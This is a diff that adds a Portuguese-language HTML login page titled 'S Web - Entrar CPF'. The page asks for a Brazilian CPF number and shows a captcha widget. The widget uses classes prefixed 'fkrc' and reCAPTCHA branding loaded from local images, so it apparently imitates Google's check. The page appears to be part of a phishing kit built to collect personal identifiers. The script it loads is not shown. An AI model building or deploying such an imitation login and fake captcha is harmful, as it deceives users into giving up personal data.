@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>S Web - Entrar CPF</title>
+  <link rel="stylesheet" href="./src/styles/global.css">
+</head>
+
+<body>
+  <main class="container">
+    <div class="subcontainer">
+      <div class="logo">
+        <img src="./src/img/logo-pink.svg" alt="Logo">
+      </div>
+      <form action="" class="form" id="cpf-form">
+        <div class="input-grupo">
+          <label for="cpf">Digite seu CPF</label>
+          <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14">
+          <div id="error-message" class="error" style="display:none;">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxwYXRoIGZpbGw9IiNENjEwM0IiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZD0iTTEyIDBjNi42MjcgMCAxMiA1LjM3MyAxMiAxMnMtNS4zNzMgMTItMTIgMTJTMCAxOC42MjcgMCAxMiA1LjM3MyAwIDEyIDB6bTAgMTVjLS44MjggMC0xLjUuNjcyLTEuNSAxLjVTMTEuMTcyIDE4IDEyIDE4czEuNS0uNjcyIDEuNS0xLjVTMTIuODI4IDE1IDEyIDE1em0wLTguNWMtLjgyOCAwLTEuNS42NzItMS41IDEuNXY0bC4wMDcuMTQ0Yy4wNzMuNzYxLjcxMyAxLjM1NiAxLjQ5MyAxLjM1Ni44MjggMCAxLjUtLjY3MiAxLjUtMS41VjhsLS4wMDctLjE0NEMxMy40MiA3LjA5NSAxMi43OCA2LjUgMTIgNi41eiIvPgo8L3N2Zz4K" alt="Error" class="error-icon">Informe o seu CPF.
+          </div>
+        </div>
+        <div class="input-grupo">
+          <div class="check">
+            <label for="checkbox" class="switch">
+              <input type="checkbox" id="checkbox" checked>
+              <div class="slider round"></div>
+            </label>
+            Lembrar CPF para o próximo acesso
+          </div>
+        </div>
+        <button id="submit-btn" disabled>Continuar</button>
+      </form>
+      <div class="captch captcha-hidden" id="captcha-container">
+        <!-- Captcha checkbox widget -->
+        <div id="fkrc-checkbox-window" class="fkrc-checkbox-window fkrc-m-p fkrc-block">
+          <div class="fkrc-checkbox-container fkrc-m-p">
+            <button type="button" id="fkrc-checkbox" class="fkrc-checkbox fkrc-m-p fkrc-line-normal"></button>
+          </div>
+          <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal">Não sou um robô</p>
+          <img src="/src/img/images.png" class="fkrc-captcha-logo fkrc-line-normal" alt="">
+          <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">reCAPTCHA</p>
+          <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">Privacy - Terms</p>
+          <img src="/src/img/captcha_spinner.gif" class="fkrc-spinner fkrc-m-p fkrc-line-normal" alt="" id="fkrc-spinner">
+      </div>
+      <!-- Captcha checkbox verification window -->
+      </div>
+      <div class="text">
+        <span class="soul"><span class="as123">Veja aqui</span>  soluções para sua empresa.</span>
+        <span id="termos">Termos de Uso e Política de Privacidade</span>
+      </div>
+    </div>
+  </main>
+  <script src="./src/js/app.js"></script>
+</body>
+
+</html>
